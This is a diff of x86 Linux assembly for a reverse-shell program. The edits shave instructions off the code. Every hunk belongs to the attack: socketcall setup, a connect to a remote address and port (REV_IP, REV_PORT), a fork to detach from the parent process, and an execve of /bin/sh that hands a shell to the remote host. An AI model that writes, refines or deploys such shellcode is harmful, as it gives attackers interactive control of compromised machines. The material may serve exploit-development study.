@@ -26,11 +26,9 @@ section .text
 ; &argv[0] is in edi
 _name:
     push edi
-    cld
     _len_loop:
-        xor ax, ax
         dec ecx     ; for an `infinite' loop
-        repne scasb ; find '\0' in argv[0]
+        repne scasb ; find '\0' in argv[0] (ax == 0 as we haven`t touched it yet)
         
     ; now edi = &argv[0] + strlen(argv[0]) + 1 (points to '\0')
     mov ecx, [esp]  ; now contains &argv[0]
@@ -74,18 +72,18 @@ _new_pid:
     ;in parent
     push NR_EXIT
     pop eax
-    xor ebx, ebx ; exit_code = 0
+    ; exit_code = random :D
     int 0x80 
     
     ; sleep(5)
     sleep:
         mov eax, NR_NANOSLEEP
-        push dword 0 ; nsec
+        ; nsec actually dont matter that much, let's skip it
         push dword 5 ; sec
         mov ebx, esp
         xor ecx, ecx
         int 0x80
-        add esp, 8
+        pop eax
     ret
 
     
@@ -135,7 +133,7 @@ _start:
     mul ebx                         ; implicit operand eax: zero out eax
     mov al, 0x66                    ; 0x66 = 102 = socketcall()
     push ebx                        ; 3rd arg: socket protocol = 0
-    mov bl, 0x1                     ; ebx = 1 = socket() function
+    inc ebx                         ; ebx = 1 = socket() function
     push byte 0x1                   ; 2nd arg: socket type = 1 (SOCK_STREAM)
     push byte 0x2                   ; 1st arg: socket domain = 2 (AF_INET)
     mov ecx, esp                    ; copy stack structure's address to ecx (pointer)
@@ -169,8 +167,8 @@ dup_loop:
     ; ecx = ptr to bind's args
 
 	push dword REV_IP   ; Remote IP address
-  	push word REV_PORT  ; Remote port
-    push word 0x0002    ; sin_family = 2 (AF_INET)
+  	                    ; sin_family = 2 (AF_INET)
+	push dword 0x0002 + REV_PORT*256*256 
 	mov ecx, esp		; ecx = ptr to *addr structure
 
 	push byte 16        ; addr_len = 16 (structure size)
@@ -197,14 +195,14 @@ connect:
     ; ecx = *argv
 	; edx = *envp
 execve_sh:
-	xor eax, eax
+	; eax == 0  since it was test'ed before jumping here
     push dword 0x0068732f           ; push /sh\0
     push dword 0x6e69622f           ; push /bin (=/bin/sh\0)
     mov ebx, esp                    ; ebx =  ptr to "/bin/sh" into ebx
     push edx                        ; edx = 0x00000000
 	mov edx, esp                    ; edx = ptr to NULL address
 	push ebx                        ; pointer to /bin/sh. Stack = 0X00, /bin/sh, 0X00000000, &/bin/sh
-	push 0
+	push eax                        ; == 0
 	push NEW_ARGV
     mov ecx, esp                    ; ecx points to shell's argv[0] ( &NEW_ARGV )
     mov al, 0xb
